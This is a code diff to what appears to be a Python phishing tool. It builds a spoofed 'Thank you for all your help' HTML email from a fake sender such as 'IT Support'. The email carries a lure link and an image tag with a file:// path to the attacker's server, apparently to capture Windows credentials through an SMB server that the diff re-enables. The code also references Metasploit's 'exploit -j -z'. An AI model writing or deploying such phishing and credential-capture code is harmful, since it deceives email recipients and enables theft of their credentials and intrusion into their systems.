@@ -175,29 +175,32 @@ exploit -j -z')
         else:
             image_server_addr = self.external_ip
 
+
+
         link_tag_name = raw_input('Enter text for link_tag to be displayed[CLICK ME!]: ') or 'Click here'
 
-        link_tag = '<a href="http://'+image_server_addr+'/" target="_blank">'+link_tag_name+'</a>' 
+        link_tag = '<a href="http://{}:{}" target="_blank">{}'\
+        .format(image_server_addr,image_server_port,link_tag_name)+'</a>' 
 
  
         ### EDIT: Email Message Template Below ###
 
         message = """From: {0} <{1}>
-        To: {2} <{3}>
-        MIME-Version: 1.0
-        Content-type: text/html
-        Subject: Thank you for all your help.
+To: {2} <{3}>
+MIME-Version: 1.0
+Content-type: text/html
+Subject: Thank you for all your help.
 
-        Staff,
-        <br>
-        ...
-        <br>
-        {5}
-        <br>
-        sincerely,
-        <br>
-        <img src=file://{4}/image/sig.jpg height="100" width="150"></a>
-        """
+Staff,
+<br>
+...
+<br>
+{5}
+<br>
+sincerely,
+<br>
+<img src=file://{4}/image/sig.jpg height="100" width="150"></a>
+"""
         ##########################################################
         
         email_message = message.format(self.sender_name, self.sender_address, \
@@ -365,10 +368,10 @@ def main():
         nargs=1,\
         help='Run local HTTP server to host image using specified port, e.g. -i 8080')
 
-    parser.add_argument('-l', '--image_server_addr', \
+    '''parser.add_argument('-l', '--image_server_addr', \
         metavar='<foo.com>',\
         nargs=1,\
-        help='custom URL for image link if not hosted locally')
+        help='custom URL for image link if not hosted locally')'''
 
     parser.add_argument('-n', '--sender_name', \
         metavar='<IT Support>', \
@@ -440,7 +443,7 @@ def main():
     c1.get_external_ip()
     c1.prompts()
     c1.validate()
-    #c1.smb_server()
+    c1.smb_server()
     c1.craft_http_content()
     c1.smtp_connection()
 
